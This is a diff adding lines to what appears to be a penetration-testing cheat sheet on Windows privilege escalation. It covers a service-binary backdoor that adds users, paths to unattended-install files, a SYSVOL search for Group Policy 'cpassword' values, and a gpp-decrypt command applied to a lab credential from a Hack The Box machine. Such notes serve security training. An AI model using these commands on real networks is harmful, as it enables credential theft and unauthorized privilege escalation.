@@ -298,6 +298,22 @@ PS C:\users\notadmin> Write-ServiceBinary -ServiceName 'Video Stream' -ServicePa
 Reboot service or computer and it will add user `john`  with password `Password123!`
 or any other command if command were specified using  `-UserName backdoor2 -Password password123`
 
+#### Unattended Install Files
+```
+C:\Windows\Panther\
+C:\Windows\Panther\Unattend\
+C:\Windows\System32
+C:\Windows\System32\sysprep\
+```
+#### GPP
+```
+findstr /S cpassword %LOGONSERVER%\sysvol\*.xml
+```
+`<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>`
+
+```
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
 #### Web
 
 Using Tcpdump to test ping injection
